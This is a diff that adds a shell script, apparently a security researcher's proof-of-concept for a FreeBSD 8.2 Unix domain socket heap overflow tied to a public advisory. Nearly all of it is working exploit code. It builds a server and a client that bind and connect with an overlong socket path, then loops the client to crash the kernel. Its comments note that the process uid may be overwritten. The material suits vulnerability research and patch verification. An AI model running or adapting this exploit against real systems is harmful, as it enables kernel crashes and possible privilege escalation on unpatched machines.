@@ -1,0 +1,171 @@
+#!/bin/sh
+#
+# fbsd-uipcsock-heap.sh, by Shaun Colley <scolley@ioactive.com>, 29/09/11
+#
+# proof-of-concept crash for the freebsd unix domain sockets heap
+# overflow.  this was tested on freebsd 8.2-RELEASE.  just a PoC for now.
+#
+# see advisory & patches for details:
+# http://www.securityfocus.com/archive/1/519864/30/0/threaded
+#
+# this PoC will usually result in a kernel panic with a read access
+# violation at 0x616161XX but sometimes the kernel will not crash straight
+# away (particularly if you shorten the length of 'sun_path' -- try 140 bytes),
+# and your uid (see output of `id`) may have been modified to the
+# decimal equivalent of 0x61616161 during the heap smash 
+
+# write server code to srv.c 
+cat > srv.c << _EOF
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/un.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <string.h>
+
+struct socky {
+  short sun_family;
+  char sun_path[160];
+};
+
+int connhandler(int incoming) 
+{
+  char buffer[256];
+  int n = 0;
+
+  n = read(incoming, buffer, 256);
+  buffer[n] = 0;
+
+  printf("%s\n", buffer);
+  n = sprintf(buffer, "fbsd uipc socket heap overflow");
+  write(incoming, buffer, n);
+ 
+  close(incoming);
+  return 0;
+}
+
+int main(void)
+{
+  struct socky overfl0w;
+  int sock, incoming; 
+  socklen_t alen;
+  pid_t child;
+  char buf[160];
+ 
+  sock = socket(PF_UNIX, SOCK_STREAM, 0);
+  if(sock < 0)
+    {
+      printf("socket() failed!\n");
+      return 1;
+    } 
+
+  memset(&overfl0w, 0, sizeof(struct socky));
+
+  overfl0w.sun_family = AF_UNIX;
+  memset(buf, 0x61, sizeof(buf));
+  buf[sizeof(buf)-1] = 0x00;
+  strcpy(overfl0w.sun_path, buf);
+
+  if(bind(sock, (struct sockaddr *)&overfl0w, 
+	  sizeof(struct socky)) != 0)
+    {
+      printf("bind() failed!\n");
+      return 1;
+    }
+
+  if(listen(sock, 5) != 0)
+    {
+      printf("listen() failed!\n");
+      return 1;
+    }
+
+  while((incoming = accept(sock, (struct sockaddr *)&overfl0w, &alen)) > -1) 
+    {
+      child = fork();
+      if(child == 0)
+	{
+	  return connhandler(incoming);
+	}
+      close(incoming);
+    }
+
+  close(sock);
+  return 0;
+}
+_EOF
+
+gcc srv.c -o srv
+
+# write the client code to client.c
+cat > client.c << _EOF
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/un.h>
+#include <unistd.h>
+#include <string.h>
+
+struct socky {
+  short sun_family;
+  char sun_path[160];
+};
+
+int main(void)
+{
+  struct socky overfl0w;
+  int  sock, n;
+  char buffer[256], buf[160];
+
+  sock = socket(PF_UNIX, SOCK_STREAM, 0);
+  if(sock < 0)
+    {
+      printf("socket() failed!\n");
+      return 1;
+    }
+
+  /* start with a clean address structure */
+  memset(&overfl0w, 0, sizeof(struct sockaddr_un));
+ 
+  overfl0w.sun_family = AF_UNIX;
+  memset(buf, 0x61, sizeof(buf));
+  buf[sizeof(buf)-1] = 0x00;
+  strcpy(overfl0w.sun_path, buf);
+
+  if(connect(sock, 
+	     (struct sockaddr *)&overfl0w, 
+	     sizeof(struct socky)) != 0)
+    {
+      printf("connect() failed!\n");
+      return 1;
+    }
+
+  n = snprintf(buffer, 256, "panic");
+  write(sock, buffer, n);
+ 
+  n = read(sock, buffer, 256);
+  buffer[n] = 0;
+
+  printf("%s\n", buffer);
+
+  close(sock);
+  return 0;
+}
+_EOF
+
+gcc client.c -o client
+
+# crash doesn't happen straight away, so loop the client to speed it up
+cat > loop.c << _EOF
+#include <stdio.h>
+
+int main() {
+int i;
+for(i = 0; i < 1000; i++) {
+system("./client");
+}
+}
+_EOF
+
+gcc loop.c -o loop
+
+./srv &
+./loop
